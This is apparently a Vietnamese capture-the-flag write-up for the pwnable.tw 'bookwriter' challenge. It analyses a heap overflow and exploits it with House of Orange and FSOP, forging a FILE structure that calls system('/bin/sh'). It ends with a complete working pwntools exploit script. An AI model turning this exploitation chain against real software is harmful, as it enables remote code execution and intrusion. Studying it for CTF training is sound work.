# book writer

## House of Orange

[link](https://github.com/wan-hyhty/Techniques#house-of-orange)

## Phân tích

- Chương trình cho ta các chức năng create, edit, view và không có free
- Ta có heap overflow ở trong edit `store_address[v1] = strlen((&store_chunk)[v1]);`, nghĩa là sau mỗi lần edit nó sẽ cập nhật size bằng strlen() tuy nhiên khi ta khai báo một chunk 0x_8 byte, ta có như sau
  ![Alt text](/bin/image-1.png)
- Khi này strlen đếm cả 3 byte của size top chunk thành 0x_8 + 3
- Tiếp đến ở hàm create ta có thể malloc 9 chunk thay vì 8 và vì store_chunk nằm trên store_size, nên ta có thể hof chunk[0].
- Cuối cùng là do có heap overflow nên ta sẽ khai thác bằng kĩ thuật House of Orange

## Khai thác

```python
def create(size, payload):
        sla(b"choice :", b"1")
        sla(b"page :", str(size).encode())
        sa(b"Content :", payload)
def view(idx):
        sla(b"choice :", b'2')
        sla(b" :", str(idx).encode())
def edit(idx, payload):
        sla(b"choice :", b'3')
        sla(b"page :", str(idx).encode())
        sla(b"tent:", payload)
```

### top chunk -> unsorted bin

```python
create(0x28, b'a') #idx 0

edit(0, b"a" * 0x28)
edit(0, b"\0" * 0x28 + p64(0xfd1))

create(0x1000, b'\0')
```

### leak heap, leak libc

```python
# Leak heap
sla(b"choice :", b'4')
p.recvuntil(b'w'*0x40)
heap = u64(p.recvline(keepends= False).ljust(8, b'\0')) - 0x10
info("Heap: " + hex(heap))
sla(b"no:0)", b"0")


# leak libc
create(0x40, b'a' * 8)
view(2)
p.recvuntil(b'a'*8)
libc.address = u64(p.recvline(keepends= False) + b'\0\0') - 0x3c4188
info("Libc: " + hex(libc.address))
```

- Do ở author và store_chunk cạnh,ta có thể tận dụng việc sử dụng %s để in ra, để leak một địa chỉ chunk trong store_chunk
  ![Alt text](/bin/image.png)
- Còn leak libc là do không xoá data khi ta malloc 1 chunk từ unsorted bin.
  ![Alt text](/bin/image2.png)

### ow size của chunk[0]

- Do là ta cần unsorted bin attack nhưng cần hof nên ta sẽ để ý rằng, nó sẽ kiểm tra ở idx 8 của store_chunk (là idx 0 của store_size) có null không. Vậy ta cần làm chỗ idx 8 null bằng cách edit size chunk[0] là 0 và malloc một chunk mới thì chunk mới ấy sẽ là size của chunk[0]

```python
# ow store_size[0]
for i in range(3, 9):
        create(0x28, b'a' * 0x28)
```

![Alt text](/bin/3.png)

### fsop

```python
f = FileStructure()
f.flags = b'/bin/sh\0'
f._IO_read_ptr = 0x61
f._IO_read_end = 0
f._IO_read_base = libc.sym._IO_list_all - 0x10
f._IO_write_base = 2
f._IO_write_ptr = 3
f.vtable = heap+0x280
edit(0, b'a' * 0x190 + bytes(f) + flat(0, 0, 0, libc.sym.system))
```

- Phần `flat(0, 0, 0, libc.sym.system)` là ta đang fake \_IO_OVERFLOW

## Kết quả

ps: Đôi khi run không được nên chạy 3 4 lần, trên local thì có thể tắt gdb trước khi run.
![Alt text](/bin/4.png)

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('bookwriter_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.pwnable.tw', 10304)
else:
        p = process(exe.path)

GDB()
def create(size, payload):
        sla(b"choice :", b"1")
        sla(b"page :", str(size).encode())
        sa(b"Content :", payload)
def view(idx):
        sla(b"choice :", b'2')
        sla(b" :", str(idx).encode())
def edit(idx, payload):
        sla(b"choice :", b'3')
        sla(b"page :", str(idx).encode())
        sla(b"tent:", payload)


sla(b" :", b"w"*0x40 + b'')
create(0x28, b'a') #idx 0

edit(0, b"a" * 0x28)
edit(0, b"a" * 0x28 + p64(0xfd1))

create(0x1000, b'\0')

# Leak heap
sla(b"choice :", b'4')
p.recvuntil(b'w'*0x40)
heap = u64(p.recvline(keepends= False).ljust(8, b'\0')) - 0x10
info("Heap: " + hex(heap))
sla(b"no:0)", b"0")


# leak libc
create(0x40, b'a' * 8)
view(2)
p.recvuntil(b'a'*8)
libc.address = u64(p.recvline(keepends= False) + b'\0\0') - 0x3c4188
info("Libc: " + hex(libc.address))

# ow store_size[0]
edit(0, b"\0" * 0x28)

for i in range(3, 9):
        create(0x28, b'a' * 0x28)


f = FileStructure()
f.flags = b'/bin/sh\0'
f._IO_read_ptr = 0x61
f._IO_read_end = libc.address
f._IO_read_base = libc.sym._IO_list_all - 0x10
f._IO_write_base = 2
f._IO_write_ptr = 3
f.vtable = heap+0x280
edit(0, b'a' * 0x190 + bytes(f) + flat(0, 0, 0, libc.sym.system))
edit(0, b'\0')
p.recvuntil('Your choice :')
p.sendline(b'1')
p.recvuntil('Size of page :')
p.sendline(b'20')
p.interactive()
```
